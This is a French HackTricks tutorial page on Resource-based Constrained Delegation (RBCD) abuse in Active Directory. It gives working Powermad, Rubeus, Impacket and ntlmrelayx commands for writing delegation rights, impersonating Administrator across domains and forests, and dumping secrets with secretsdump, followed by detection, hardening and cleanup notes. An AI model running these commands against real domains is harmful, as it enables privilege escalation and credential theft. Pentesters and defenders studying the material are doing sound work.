# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Bases de la Resource-based Constrained Delegation

Cela ressemble à la [Constrained Delegation](constrained-delegation.md) classique, mais **au lieu** d'accorder des permissions à un **objet** pour **se faire passer pour n'importe quel utilisateur auprès d'une machine**, la Resource-based Constrained Delegation **définit**, dans **l'objet**, qui peut se faire passer pour n'importe quel utilisateur auprès de celui-ci.

Dans ce cas, l'objet contraint possède un attribut appelé _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ contenant le nom de l'utilisateur qui peut se faire passer pour n'importe quel autre utilisateur auprès de celui-ci.

Une autre différence importante entre cette Constrained Delegation et les autres délégations est que tout utilisateur disposant de **permissions d'écriture sur un compte machine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) peut définir **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (pour les autres formes de Delegation, des privilèges de domain admin étaient nécessaires).

### Nouveaux concepts

Dans la Constrained Delegation, il était indiqué que le flag **`TrustedToAuthForDelegation`**, situé dans la valeur _userAccountControl_ de l'utilisateur, était nécessaire pour effectuer un **S4U2Self.** Mais ce n'est pas tout à fait vrai.\
En réalité, même sans cette valeur, vous pouvez effectuer un **S4U2Self** contre n'importe quel utilisateur si vous êtes un **service** (possédez un SPN). En revanche, si vous **avez `TrustedToAuthForDelegation`**, le TGS retourné sera **Forwardable** et, si vous ne possédez **pas** ce flag, le TGS retourné ne sera **pas** **Forwardable**.

Cependant, si le **TGS** utilisé dans **S4U2Proxy** n'est **PAS Forwardable**, une tentative d'abus d'une **basic Constrained Delegation** **ne fonctionnera pas**. Mais si vous essayez d'exploiter une **Resource-Based Constrained Delegation**, cela fonctionnera.

### Structure de l'attaque

> Si vous disposez de **privilèges équivalents en écriture** sur un compte **Computer**, vous pouvez obtenir un **accès privilégié** à cette machine.

Supposons que l'attaquant dispose déjà de **privilèges équivalents en écriture sur l'ordinateur victime**.

1. L'attaquant **compromet** un compte possédant un **SPN** ou **en crée un** (« Service A »). Notez que tout _**Admin User**_ sans autre privilège particulier peut **créer jusqu'à 10 objets Computer** (**_MachineAccountQuota_**) et leur attribuer un **SPN**. L'attaquant peut donc simplement créer un objet Computer et lui attribuer un SPN.
2. L'attaquant **abuse de son privilège WRITE** sur l'ordinateur victime (ServiceB) pour configurer une resource-based constrained delegation afin d'autoriser ServiceA à se faire passer pour n'importe quel utilisateur auprès de cet ordinateur victime (ServiceB).
3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A vers Service B pour un utilisateur disposant d'un **accès privilégié à Service B**.
1. S4U2Self (depuis le compte compromis/créé possédant le SPN) : demander un **TGS d'Administrator vers moi** (non Forwardable).
2. S4U2Proxy : utiliser le **TGS non Forwardable** de l'étape précédente pour demander un **TGS** d'**Administrator** vers l'**hôte victime**.
3. Même si vous utilisez un TGS non Forwardable, comme vous exploitez une Resource-based constrained delegation, cela fonctionnera.
4. L'attaquant peut effectuer un **pass-the-ticket** et **se faire passer pour l'utilisateur** afin d'obtenir un **accès au ServiceB victime**.

Pour vérifier le _**MachineAccountQuota**_ du domaine, vous pouvez utiliser :
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attaque

### Création d’un objet ordinateur

Vous pouvez créer un objet ordinateur au sein du domaine à l’aide de **[powermad](https://github.com/Kevin-Robertson/Powermad) :**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuring Resource-based Constrained Delegation

**Avec le module PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilisation de powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Effectuer une attaque S4U complète (Windows/Rubeus)

Tout d'abord, nous avons créé le nouvel objet ordinateur avec le mot de passe `123456`, nous avons donc besoin du hash de ce mot de passe :
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Cela affichera les hashes RC4 et AES de ce compte.\
L’attaque peut maintenant être effectuée :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Vous pouvez générer davantage de tickets pour davantage de services en ne faisant qu’une seule demande à l’aide du paramètre `/altservice` de Rubeus :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Notez que les utilisateurs possèdent un attribut appelé "**Cannot be delegated**". Si cet attribut est défini sur True pour un utilisateur, vous ne pourrez pas vous faire passer pour lui. Cette propriété est visible dans BloodHound.

### Outils Linux : RBCD de bout en bout avec Impacket (2024+)

Si vous opérez depuis Linux, vous pouvez effectuer la chaîne RBCD complète à l'aide des outils officiels d'Impacket :
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- Si la signature LDAP/LDAPS est imposée, utilisez `impacket-rbcd -use-ldaps ...`.
- Préférez les clés AES ; de nombreux domaines modernes restreignent RC4. Impacket et Rubeus prennent tous deux en charge les flux uniquement en AES.
- Impacket peut réécrire le `sname` ("AnySPN") pour certains outils, mais obtenez le SPN correct dès que possible (par exemple, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD inter-domaines et inter-forêts

Si le **principal délégant** que vous contrôlez se trouve dans un **domaine différent** (ou même une **forêt différente**) de celui de l’**ordinateur ressource**, l’abus reste du **RBCD**, mais le flux de tickets n’est plus le flux habituel `S4U2Self -> S4U2Proxy` au sein d’un seul domaine.

### RBCD inter-domaines : configurer le principal étranger par SID

Lorsque vous définissez `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis un **domaine différent**, la machine/l’utilisateur étranger peut **ne pas être résolvable par son nom** dans le LDAP du domaine cible. Dans ce cas, configurez l’entrée de délégation à l’aide du **SID** du principal étranger au lieu de son sAMAccountName/UPN.

Cela est particulièrement pertinent lors du relay de NTLM vers LDAP avec `ntlmrelayx.py` :
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes :
- `--sid` indique à `ntlmrelayx.py` de traiter `--escalate-user` comme un SID, ce qui est requis lorsque le compte délégant est externe au domaine cible.
- Même si l'outil affiche `User not found in LDAP`, l'écriture de la délégation peut tout de même réussir, car le descripteur de sécurité stocke directement le SID externe.

### RBCD inter-domaines : séquence S4U cross-realm

Une fois le principal externe présent dans `msDS-AllowedToActOnBehalfOfOtherIdentity`, le flux inter-domaines fonctionnel est le suivant :

1. Obtenir un **TGT** pour le principal délégant depuis son propre domaine.
2. Demander un **TGT de referral** pour `krbtgt/<target-domain>`.
3. Demander un **referral S4U2Self cross-realm** pour l'utilisateur usurpé sur le DC du domaine cible.
4. Demander le ticket **S4U2Self** réel pour cet utilisateur depuis le domaine délégant.
5. Effectuer **S4U2Proxy** dans le domaine délégant afin d'obtenir un ticket de referral pour le domaine cible.
6. Effectuer le **S4U2Proxy** final sur le DC du domaine cible afin d'obtenir le service ticket pour `cifs/host.target`, `host/host.target`, etc.

C'est pourquoi les outils Linux standards échouent souvent avec le RBCD inter-domaines :
- le **realm** de la requête peut devoir différer du realm du TGT utilisé dans le `TGS-REQ`
- la chaîne nécessite des étapes **S4U2Proxy indépendantes**, et pas uniquement `S4U2Self` ou `S4U2Self` immédiatement suivi d'un unique `S4U2Proxy`

### RBCD inter-domaines depuis Linux

Synacktiv a publié une implémentation de `getST.py` dans Impacket qui reproduit la séquence cross-realm depuis Linux en gérant explicitement les deux KDC :
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Opérationnellement, les nouveaux arguments sont :
- `-dc-ip` : DC du domaine **delegating**
- `-targetdomain` : domaine de l’ordinateur **resource**
- `-targetdc` : DC du domaine **resource**

### Limitations de RBCD cross-forest

Le RBCD cross-forest présente une limitation importante : **l’utilisateur impersonated doit appartenir à la même forest que le principal delegating**. Autrement dit, si votre machine account contrôlé se trouve dans `valhalla.local` et que la resource target se trouve dans `asgard.local`, vous ne pouvez généralement **pas impersonate arbitrairement des utilisateurs `asgard.local`** vers cette resource via RBCD.

Cela reste exploitable lorsque :
- l’utilisateur de la **delegating forest** est **local admin** (ou dispose d’autres privilèges) sur l’hôte resource de l’autre forest
- une trust autorise le chemin d’authentification requis et que le SID étranger est accepté dans le security descriptor de l’ordinateur target

### Particularités du protocole RBCD cross-forest

Le RBCD cross-forest ne consiste pas simplement à faire du « cross-domain avec une trust ». Le flow observé présente deux particularités que les outils courants ne gèrent historiquement pas :

1. Une requête **S4U2Proxy** supplémentaire qui définit `PA-PAC-OPTIONS=branch-aware`
2. Un service ticket final qui peut être retourné en **RC4**, même lorsque d’autres etypes ont été demandés

Le flow pratique est le suivant :

1. Obtenir un TGT pour le principal delegating dans la forest A.
2. Demander un **S4U2Self** pour l’utilisateur impersonated dans la forest A.
3. Demander un **S4U2Proxy** dans la forest A afin d’obtenir un referral TGT pour la forest B.
4. Envoyer un second **S4U2Proxy** dans la forest A **sans le ticket S4U2Self comme additional ticket**, mais avec `branch-aware` activé, afin d’obtenir un autre referral TGT pour la forest B.
5. Demander éventuellement un service ticket normal dans la forest B pour le principal delegating (ce ticket n’est pas requis pour l’abus final).
6. Utiliser les referral tickets des étapes 3 et 4 pour demander le ticket **S4U2Proxy** final dans la forest B pour l’utilisateur forest-A impersonated vers le SPN target.

### RBCD cross-forest depuis Linux

La même branche Synacktiv d’Impacket ajoute un switch `-forest` pour cette logique :
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### RBCD récursif multi-domaines (3+ domaines)

Dans les **forêts multi-domaines**, **S4U2Self** et **S4U2Proxy** peuvent être **récursifs** au lieu de s'arrêter après une seule referral :

- **S4U2Self récursif** : le premier `S4U2Self` est envoyé au **domaine de l'utilisateur usurpé**, les sauts intermédiaires parent/enfant sont parcourus avec des referrals `TGS-REQ` normales pour `krbtgt/<REALM>`, et le **`S4U2Self` final** est envoyé dans le **propre domaine du principal délégant**.
- Cela signifie que le fait de **détenir uniquement un TGT** pour un compte machine peut suffire à usurper l'identité d'un **admin d'un autre domaine de la même forêt** et à demander `cifs/host`, `host/host`, `wsman/host`, etc.
- **S4U2Proxy récursif** suit la chaîne d'approbation de la même manière : les sauts intermédiaires réutilisent le ticket précédent comme TGT lors de la demande de la referral `krbtgt/<REALM>` suivante, et seul le dernier saut renvoie le ticket de service final.

Un exemple pratique dans une même forêt est le suivant :
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD inter-domaines / inter-forêts sans SPN

Si le **principal délégant est un utilisateur sans SPN**, le dernier `S4U2Self` récursif échoue avec **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La solution de contournement consiste à **réessayer uniquement le dernier hop avec `S4U2Self+U2U`**.

Version courte de la chaîne d'abus :

1. S'authentifier avec le **hash NT** afin de pousser le KDC vers **RC4-HMAC (etype 23)**.
2. Demander d'abord **`-self -u2u`** et conserver ce ticket séparément de l'étape proxy ultérieure.
3. Extraire la clé de session du **TGT** avec `describeTicket.py`.
4. Remplacer le **hash NT** de l'utilisateur par cette **clé de session** avec `changepasswd.py -newhashes <session_key>`.
5. Réutiliser le ticket **`S4U2Self+U2U`** comme **`-additional-ticket`** lors d'une requête **`-proxy`** distincte.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operational caveats :

- Lorsque le **premier trusted hop est déjà une autre forest**, préférez l'algorithme **branch-aware** (`getST.py ... -forest`) afin de reproduire le comportement natif de Windows. Si la foreign forest n'est atteinte que plus tard dans la chaîne, le flux récursif non branch-aware peut encore fonctionner.
- Sur les DC **Windows Server 2022/2025** récents, le RC4 forcé peut échouer avec **`KDC_ERR_ETYPE_NOSUPP`** en raison de la dépréciation de RC4 ; cela peut rendre le **RBCD sans SPN** impossible, même si le RBCD classique basé sur un SPN fonctionne toujours avec AES.
- Exécutez **`S4U2Self+U2U` avant de modifier le hash/mot de passe de l'utilisateur** : `SamrChangePasswordUser` ne recalcule pas les clés AES Kerberos du compte ; effectuer le changement de mot de passe en premier peut donc casser les demandes de tickets ultérieures.
- Le compte usurpé doit toujours être **delegable** : **Protected Users** et les comptes avec **`NOT_DELEGATED`** / **« Account is sensitive and cannot be delegated »** bloquent la chaîne.

## Notes de détection / hardening

- Les chemins RBCD entre domaines/forests sont toujours généralement créés via un **ACL abuse** ou un **relay-to-LDAP**. Appliquez la **signature LDAP** et le **channel binding LDAP** sur les DC afin de bloquer les chemins de mise en place courants.
- Auditez les comptes pouvant écrire dans `msDS-AllowedToActOnBehalfOfOtherIdentity` sur les objets ordinateur et résolvez les SID enregistrés, y compris les **foreign security principals**.
- Dans les environnements fortement basés sur les trusts, vérifiez la **Selective Authentication**, le **SID filtering** et si des utilisateurs d'une foreign forest disposent de droits **local admin** sur les resource hosts.

### Accès

La dernière ligne de commande effectuera la **complete S4U attack** et injectera le TGS d'Administrator vers l'hôte victime en **mémoire**.\
Dans cet exemple, un TGS pour le service **CIFS** a été demandé depuis Administrator ; vous pourrez donc accéder à **C$** :
```bash
ls \\victim.domain.local\C$
```
### Abuser de différents tickets de service

Découvrez les [**tickets de service disponibles ici**](silver-ticket.md#available-services).

## Énumération, audit et nettoyage

### Énumérer les ordinateurs avec RBCD configuré

PowerShell (décodage du SD pour résoudre les SID) :
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lire ou vider avec une seule commande) :
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Nettoyage / réinitialisation de RBCD

- PowerShell (effacer l’attribut) :
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erreurs Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`** : Cela signifie que kerberos est configuré pour ne pas utiliser DES ou RC4 et que vous fournissez uniquement le hash RC4. Fournissez à Rubeus au moins le hash AES256 (ou fournissez-lui simplement les hashs rc4, aes128 et aes256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** pendant `-self` pour un utilisateur normal : le principal délégant n'a probablement **aucun SPN**. Réessayez le **dernier saut** avec **`S4U2Self+U2U`** au lieu d'un **`S4U2Self`** classique.
- **`KDC_ERR_ETYPE_NOSUPP`** pendant un **RBCD sans SPN** : les DC récents peuvent refuser le chemin **RC4-HMAC** forcé requis par l'astuce **`S4U2Self+U2U` + substitution de la clé de session**. Essayez plutôt un chemin RBCD classique **basé sur un SPN** avec AES.
- **`KRB_AP_ERR_SKEW`** : Cela signifie que l'heure de l'ordinateur actuel est différente de celle du DC et que kerberos ne fonctionne pas correctement.
- **`preauth_failed`** : Cela signifie que le nom d'utilisateur + les hashs fournis ne permettent pas de se connecter. Vous avez peut-être oublié de mettre le caractère "$" dans le nom d'utilisateur lors de la génération des hashs (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** : Cela peut signifier :
- L'utilisateur que vous essayez d'usurper ne peut pas accéder au service souhaité (parce que vous ne pouvez pas l'usurper ou parce qu'il ne dispose pas de privilèges suffisants)
- Le service demandé n'existe pas (si vous demandez un ticket pour winrm alors que winrm ne fonctionne pas)
- Le fakecomputer créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui redonner.
- Vous abusez de KCD classique ; souvenez-vous que RBCD fonctionne avec des tickets S4U2Self non forwardable, tandis que KCD nécessite des tickets forwardable.

## Notes, relays et alternatives

- Vous pouvez également écrire le SD RBCD via AD Web Services (ADWS) si LDAP est filtré. Voir :


{{#ref}}
adws-enumeration.md
{{#endref}}

- Les chaînes de Kerberos relay se terminent fréquemment par un RBCD afin d'obtenir SYSTEM local en une seule étape. Voir des exemples pratiques de bout en bout :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si la signature LDAP/la liaison de canal sont **désactivées** et que vous pouvez créer un compte machine, des outils comme **KrbRelayUp** peuvent relayer une authentification Kerberos forcée vers LDAP, définir `msDS-AllowedToActOnBehalfOfOtherIdentity` pour votre compte machine sur l'objet ordinateur cible, puis usurper immédiatement **Administrator** via S4U depuis une machine externe.

## Références

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
